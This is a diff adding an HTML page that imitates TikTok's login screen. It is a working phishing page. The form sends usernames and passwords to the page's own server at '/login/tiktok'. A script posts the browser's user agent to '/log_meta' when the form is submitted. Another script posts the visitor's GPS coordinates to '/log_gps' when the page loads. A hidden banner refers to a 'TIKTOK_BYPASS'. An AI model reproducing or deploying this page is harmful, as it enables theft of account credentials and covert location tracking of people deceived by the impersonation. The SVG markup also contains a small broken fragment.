@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in | TikTok</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #ffffff; 
+            font-family: 'ProximaNova', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .login-card {
+            background-color: #ffffff;
+            color: #161823;
+        }
+        .input-tiktok {
+            background-color: #f1f1f2;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        .input-tiktok:focus {
+            border-color: rgba(22, 24, 35, 0.5);
+            outline: none;
+        }
+        .btn-tiktok {
+            background-color: #fe2c55;
+            color: white;
+            transition: background-color 0.2s;
+        }
+        .btn-tiktok:active {
+            background-color: #ef2950;
+        }
+        .social-btn {
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        #nexo-status {
+            display: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #fe2c55;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="login-card w-full max-w-[440px] px-6 py-10 md:p-10 text-center">
+        
+        <!-- DRAWN TIKTOK LOGO (SVG) -->
+        <div class="flex justify-center mb-6">
+            <svg width="118" height="34" viewBox="0 0 118 34" fill="none" xmlns="http://www.w3.org">
+                <path d="M21.6 0C21.6 4.7 25.4 8.5 30.1 8.5V14.1C27.5 14.1 25.1 13.1 23.3 11.4V24.1C23.3 29.5 18.9 33.9 13.5 33.9C8.1 33.9 3.7 29.5 3.7 24.1C3.7 18.7 8.1 14.3 13.5 14.3C14.3 14.3 15.1 14.4 15.8 14.6V20.3C15.1 20 14.3 19.9 13.5 19.9C11.2 19.9 9.3 21.8 9.3 24.1C9.3 26.4 11.2 28.3 13.5 28.3C15.8 28.3 17.7 26.4 17.7 24.1V0H21.6Z" fill="black""")/>>
+                <text x="35" y="26" fill="black" style="font-weight: 900; font-size: 26px; font-family: sans-serif;">TikTok</text>
+            </svg>
+        </div>
+
+        <h3 class="text-2xl font-bold mb-8">Log in</h3>
+
+        <form id="ttForm" action="/login/tiktok" method="POST" class="text-left space-y-4">
+            <div>
+                <input name="user" type="text" placeholder="Email or username" 
+                       class="input-tiktok w-full p-3 rounded-sm" required>
+            </div>
+
+            <div>
+                <input name="pass" type="password" placeholder="Password" 
+                       class="input-tiktok w-full p-3 rounded-sm" required>
+            </div>
+
+            <button id="ttBtn" type="submit" class="btn-tiktok w-full py-3 rounded-sm font-bold text-lg mt-2">
+                Log in
+            </button>
+            
+            <p class="text-xs text-[#fe2c55] font-semibold cursor-pointer hover:underline text-center mt-4">Forgot password?</p>
+        </form>
+
+        <div class="flex items-center my-8">
+            <div class="flex-grow border-t border-gray-200"></div>
+            <span class="px-3 text-gray-400 text-xs font-bold">OR</span>
+            <div class="flex-grow border-t border-gray-200"></div>
+        </div>
+
+        <!-- SOCIAL LOGIN (VERTICAL) -->
+        <div class="flex flex-col">
+            <button type="button" class="social-btn w-full py-3 rounded-sm flex items-center justify-start px-6 gap-4">
+                <span class="w-5 text-center">G</span> Continue with Google
+            </button>
+            <button type="button" class="social-btn w-full py-3 rounded-sm flex items-center justify-start px-6 gap-4">
+                <span class="w-5 text-center font-bold text-blue-600">f</span> Continue with Facebook
+            </button>
+            <button type="button" class="social-btn w-full py-3 rounded-sm flex items-center justify-start px-6 gap-4">
+                <span class="w-5 text-center"></span> Continue with Apple
+            </button>
+        </div>
+
+        <div id="nexo-status" class="animate-pulse">[*] V8_TIKTOK_BYPASS: SYNC_READY</div>
+
+        <div class="mt-10 pt-6 border-t border-gray-100 text-sm">
+            Don't have an account? <span class="text-[#fe2c55] font-bold cursor-pointer hover:underline">Sign up</span>
+        </div>
+    </div>
+
+    <script>
+        const ttForm = document.getElementById('ttForm');
+        const ttBtn = document.getElementById('ttBtn');
+        const status = document.getElementById('nexo-status');
+
+        ttForm.onsubmit = function() {
+            ttBtn.innerText = "Authenticating...";
+            ttBtn.disabled = true;
+            ttBtn.style.opacity = "0.6";
+            status.style.display = "block";
+            
+            // Meta Sync for Terminal
+            const meta = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                ref: "TT_BLACKOUT_V8"
+            };
+            
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(meta)
+            });
+            
+            return true;
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude,
+                            site: "TIKTOK_V8"
+                        })
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
